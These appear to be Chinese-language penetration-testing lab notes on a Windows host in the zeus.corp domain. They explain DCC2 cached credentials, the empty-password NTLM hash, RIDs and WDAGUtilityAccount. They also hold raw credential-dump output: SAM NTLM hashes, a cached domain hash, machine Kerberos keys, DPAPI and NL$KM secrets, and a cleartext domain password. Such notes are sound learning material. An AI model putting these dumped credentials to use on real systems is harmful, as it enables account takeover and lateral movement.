
| Administrator               |                         | a1fcb4118dfcbf52a53d6299aab57055 |     |     |
| --------------------------- | ----------------------- | -------------------------------- | --- | --- |
| Guest                       |                         | 31d6cfe0d16ae931b73c59d7e0c089c0 |     |     |
| DefaultAccount              |                         | 31d6cfe0d16ae931b73c59d7e0c089c0 |     |     |
| WDAGUtilityAccount          |                         | 11ba4cb6993d434d8dbba9ba45fd9011 |     |     |
| zeus.corp/Administratorcorp |                         | d74906c10d90e312b0cafe5f35e165e2 |     |     |
| zeus.corp/o.foller          |                         | d74906c10d90e312b0cafe5f35e165e2 |     |     |
| zeus/o.foller               | EarlyMorningFootball777 |                                  |     |     |
|                             |                         |                                  |     |     |
|                             |                         |                                  |     |     |
|                             |                         |                                  |     |     |

$DCC2$迭代次数#用户名#哈希值
$DCC2$10240#Administrator
## **$DCC2$**

这是 **凭据类型标识**。

- **DCC2 = Domain Cached Credentials v2**
    
- 又叫 **MS-Cache v2**
    
- 这是 Windows 在本地缓存域密码哈希的格式
    
- 通常出现在离线登录、缓存登录场景
    

➡️ 表示：这是一次**缓存域密码的哈希**，不能直接当 NTLM 使用。

| RID     | Account                                          |
| ------- | ------------------------------------------------ |
| **500** | **Administrator**                                |
| **501** | Guest                                            |
| **502** | KRBTGT (Kerberos Ticket-Granting Ticket Account) |
| **512** | Domain Admins group                              |
| **513** | Domain Users group                               |
| **519** | Enterprise Admins                                |
| **520** | Group Policy Creator Owners                      |
# 为什么 NTLM 哈希

`31d6cfe0d16ae931b73c59d7e0c089c0`

表示 **空密码（empty password）**

---

# 🔍 1. NTLM 的计算方法（关键）

NTLM Hash =

`MD4(UTF-16-LE(密码))`

如果密码为空，那么：

`UTF-16-LE("") = 空字符串 MD4("") = 31d6cfe0d16ae931b73c59d7e0c089c0`

MD4 对 **空字符串的结果永远固定**，不随操作系统变化。

---

# 📌 2. 所以只要你看到：

`31d6cfe0d16ae931b73c59d7e0c089c0`

它就代表：

`密码 = ""   （完全空）`

永远如此，不可能有第二种情况。


以及为什么它被称为 **Windows Defender Application Guard 的内部账号**。

---

# 🧩 1. 什么是 WDAGUtilityAccount？

这是 Windows 在开启某些安全功能后 **自动创建的系统级内部账号**：

- **WDAG = Windows Defender Application Guard**
    
- 这是 Windows 为 _隔离浏览器、虚拟化沙箱、安全容器_ 使用的账户  
    用来运行 Edge 隔离容器、AppContainer、VBS 相关进程
    

⚠️ 这个账号不是为用户使用准备的，因此：

- 默认 **隐藏**
    
- 默认 **禁用**
    
- 默认 **不能登录**
    
- 默认 **不能 WinRM、SMB、RDP**
    

账号用途：  
在 **隔离浏览器容器（Edge sandbox）** 中运行后台服务、映射虚拟磁盘、同步虚拟环境。

---

# 🧩 2. 为什么它有 NTLM 哈希？

因为即使是系统账号，Windows 也需要：

- 在 SAM registry 里注册账户信息
    
- 给它分配 RID
    
- 生成 LM/NTLM 哈希（即使永远不用）
    

这就是为什么你在 `sam` dump 看到：

`WDAGUtilityAccount:504:LM:NTLM`

即使这个账号不会用于网络认证，它依然拥有 NTLM hash（Windows 自动生成）。








[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
[*] Dumping cached domain logon information (domain/username:hash)
zeus.corp/Administrator
d74906c10d90e312b0cafe5f35e165e2
ZEUS.CORP/Administrator:$DCC2$10240#Administrator#d74906c10d90e312b0cafe5f35e165e2


[*] Dumping LSA Secrets
[*] $MACHINE.ACC
zeus\CLIENT01$:aes256-cts-hmac-sha1-96:280256275676b88948a75f76496174363ee029ae80d69e6028b35d47f17f9fe9
zeus\CLIENT01$:aes128-cts-hmac-sha1-96:607a9b0f9d634fed220a9309f4152cdb
zeus\CLIENT01$:des-cbc-md5:4fb979a8c7ba341f
zeus\CLIENT01$:plain_password_hex:9466c17d26039e47927836e955de9a40cf8a58b1f2deb90f99c82af3f7f4cc36a186d1d0cab660ab5f98b5d2c9391655c08e9b0c50a4a20278f3f469709b99bf17918a74de509fb63a4e4ad017495713c3fc28bef7861c43b57f4bc700c8e23d0effe8f97d0bbfd75e484b784d7dac0382502b53ad8edc2d9c3aaaa0e1771382810b5e4eefb95ea4cf5154615ab97695bfdf12ebfc946bd8a23d0ac88d15f54e65a8939063253a21f3f9f75599970248a591e570bc7024d4c938357a7a4a3c982e771f16ca6332a2c6e508f1b14298e16064b660eed852b17765478bb1ab359b4bb6c88006ad741e95f79be96abe2c8a
zeus\CLIENT01$:aad3b435b51404eeaad3b435b51404ee:a1421447eaae2737743ff12427615cdb:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x6dfcc3928303fe5ba69ed2445dcc0587b8b96394
dpapi_userkey:0xa793bf0aec52d452327117ff7cf596295d4001be
[*] NL$KM
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] _SC_SNMPTRAP
zeus\o.foller:EarlyMorningFootball777
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

